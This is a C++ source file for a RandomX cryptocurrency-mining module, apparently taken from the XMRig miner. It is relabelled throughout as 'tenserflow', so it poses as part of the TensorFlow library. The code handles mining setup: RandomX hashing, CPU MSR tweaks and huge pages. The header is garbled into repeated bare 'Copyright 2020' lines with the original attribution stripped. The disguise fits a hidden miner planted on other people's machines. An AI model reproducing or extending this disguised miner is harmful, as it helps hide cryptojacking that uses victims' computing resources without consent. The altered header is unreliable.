/* TENSERflow
  Copyright 2020
  Copyright 2020
  Copyright 2020
  Copyright 2020
  Copyright 2020
  Copyright 2020
  Copyright 2020
  Copyright 2020
  Copyright 2020
  Copyright 2020
 *
 Copyright 2020
 */


#include "crypto/rx/Rx.h"
#include "backend/common/Tags.h"
#include "backend/cpu/CpuConfig.h"
#include "backend/cpu/CpuThreads.h"
#include "base/io/log/Log.h"
#include "crypto/rx/RxConfig.h"
#include "crypto/rx/RxQueue.h"
#include "crypto/randomx/randomx.h"
#include "crypto/randomx/soft_aes.h"


namespace tenserflow {


class RxPrivate;


static bool osInitialized   = false;
static bool msrInitialized  = false;
static RxPrivate *d_ptr     = nullptr;


class RxPrivate
{
public:
    inline RxPrivate(IRxListener *listener) : queue(listener) {}

    RxQueue queue;
};


} // namespace tenserflow


tenserflow::HugePagesInfo tenserflow::Rx::hugePages()
{
    return d_ptr->queue.hugePages();
}


tenserflow::RxDataset *tenserflow::Rx::dataset(const Job &job, uint32_t nodeId)
{
    return d_ptr->queue.dataset(job, nodeId);
}


void tenserflow::Rx::destroy()
{
    if (osInitialized) {
        msrDestroy();
    }

    delete d_ptr;

    d_ptr = nullptr;
}


void tenserflow::Rx::init(IRxListener *listener)
{
    d_ptr = new RxPrivate(listener);
}


template<typename T>
bool tenserflow::Rx::init(const T &seed, const RxConfig &config, const CpuConfig &cpu)
{
    if (seed.algorithm().family() != Algorithm::RANDOM_X) {
        if (msrInitialized) {
            msrDestroy();
            msrInitialized = false;
        }

        return true;
    }

    randomx_set_scratchpad_prefetch_mode(config.scratchpadPrefetchMode());

    if (isReady(seed)) {
        return true;
    }

    if (!msrInitialized) {
        msrInit(config, cpu.threads().get(seed.algorithm()).data());
        msrInitialized = true;
    }

    if (!osInitialized) {
        setupMainLoopExceptionFrame();
        if (!cpu.isHwAES()) {
            SelectSoftAESImpl();
        }
        osInitialized = true;
    }

    d_ptr->queue.enqueue(seed, config.nodeset(), config.threads(cpu.limit()), cpu.isHugePages(), config.isOneGbPages(), config.mode(), cpu.priority());

    return false;
}


template<typename T>
bool tenserflow::Rx::isReady(const T &seed)
{
    return d_ptr->queue.isReady(seed);
}


#ifndef TENSERFLOW_FEATURE_MSR
void tenserflow::Rx::msrInit(const RxConfig &, const std::vector<CpuThread> &)
{
}


void tenserflow::Rx::msrDestroy()
{
}
#endif


#ifndef TENSERFLOW_FIX_RYZEN
void tenserflow::Rx::setupMainLoopExceptionFrame()
{
}
#endif


namespace tenserflow {


template bool Rx::init(const RxSeed &seed, const RxConfig &config, const CpuConfig &cpu);
template bool Rx::isReady(const RxSeed &seed);
template bool Rx::init(const Job &seed, const RxConfig &config, const CpuConfig &cpu);
template bool Rx::isReady(const Job &seed);


} // namespace tenserflow
